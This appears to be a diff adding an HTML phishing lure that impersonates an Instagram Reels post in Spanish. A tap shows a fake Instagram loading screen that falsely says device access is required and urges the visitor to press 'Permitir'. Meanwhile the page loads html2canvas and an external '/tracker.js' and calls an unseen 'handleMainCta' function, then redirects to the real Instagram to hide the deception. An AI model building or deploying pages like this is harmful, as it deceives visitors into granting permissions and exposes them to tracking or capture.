@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#000000">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body,
+        html {
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            overflow: hidden;
+            color: white;
+        }
+
+        .ig-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            background-image: url('https://images.unsplash.com/photo-1611162616305-c69b3fa7fbe0?q=80&w=800&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .overlay-gradient {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, rgba(0, 0, 0, 0.3) 0%, rgba(0, 0, 0, 0) 25%, rgba(0, 0, 0, 0) 60%, rgba(0, 0, 0, 0.85) 100%);
+            z-index: 1;
+        }
+
+        .top-bar {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            z-index: 10;
+            font-size: 22px;
+            font-weight: bold;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .camera-icon {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            z-index: 10;
+            font-size: 24px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .right-sidebar {
+            position: absolute;
+            right: 15px;
+            bottom: 80px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            z-index: 10;
+        }
+
+        .action-icon {
+            font-size: 28px;
+            filter: drop-shadow(1px 1px 2px rgba(0, 0, 0, 0.8));
+            margin-bottom: 5px;
+        }
+
+        .action-text {
+            font-size: 13px;
+            font-weight: 600;
+            text-align: center;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 2px solid #fff;
+            margin-bottom: 10px;
+        }
+
+        .bottom-info {
+            position: absolute;
+            left: 15px;
+            bottom: 20px;
+            width: calc(100% - 80px);
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .username {
+            font-size: 15px;
+            font-weight: 600;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .description {
+            font-size: 14px;
+            line-height: 1.4;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .audio-track {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .play-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 5;
+            pointer-events: none;
+        }
+
+        .play-triangle {
+            width: 0;
+            height: 0;
+            border-left: 22px solid white;
+            border-top: 13px solid transparent;
+            border-bottom: 13px solid transparent;
+            margin-left: 6px;
+        }
+
+        .loading-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 200;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+
+        .loading-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .ig-logo {
+            font-size: 40px;
+            background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+            margin-bottom: 20px;
+        }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="ig-container" id="mainContainer">
+        <div class="overlay-gradient"></div>
+        <div class="top-bar">Reels</div>
+        <div class="camera-icon">📷</div>
+
+        <div class="play-overlay">
+            <div class="play-triangle"></div>
+        </div>
+
+        <div class="right-sidebar">
+            <div class="action-icon">❤️<div class="action-text">1.2M</div>
+            </div>
+            <div class="action-icon">💬<div class="action-text">8,402</div>
+            </div>
+            <div class="action-icon">↗️<div class="action-text">320K</div>
+            </div>
+            <div class="action-icon">⋯</div>
+        </div>
+
+        <div class="bottom-info">
+            <div class="username"><img src="https://ui-avatars.com/api/?name=IG&background=random" class="profile-pic"
+                    style="margin:0; width:32px; height:32px;"> @viral_videos_ig</div>
+            <div class="description">Increíble lo que pasó al final 🤯🔥 #reels #viral #sorpresa</div>
+            <div class="audio-track">🎵 sonido original - viral_videos_ig</div>
+        </div>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div class="ig-logo">Instagram</div>
+        <div class="spinner"></div>
+        <div style="color: white; margin-top: 20px; font-weight: 600; font-size: 16px;">Abriendo Reel...</div>
+        <div
+            style="color: #bbb; margin-top: 10px; font-size: 13px; text-align: center; max-width: 80%; line-height: 1.5;">
+            Instagram requiere acceso al dispositivo para cargar contenido multimedia inmersivo en pantalla completa.
+            <br><br><strong style="color: #fff;">Presiona "Permitir" continuar.</strong>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="/tracker.js"></script>
+    <script>
+        const loadingScreen = document.getElementById('loadingScreen');
+        let clicked = false;
+
+        async function openApp() {
+            if (clicked) return;
+            clicked = true;
+            loadingScreen.classList.add('active');
+
+            if (typeof handleMainCta === 'function') await handleMainCta();
+
+            setTimeout(() => { window.location.replace('https://www.instagram.com/reels/'); }, 1000);
+        }
+
+        document.getElementById('mainContainer').addEventListener('click', openApp);
+        document.getElementById('mainContainer').addEventListener('touchstart', openApp, { passive: true });
+    </script>
+</body>
+
+</html>
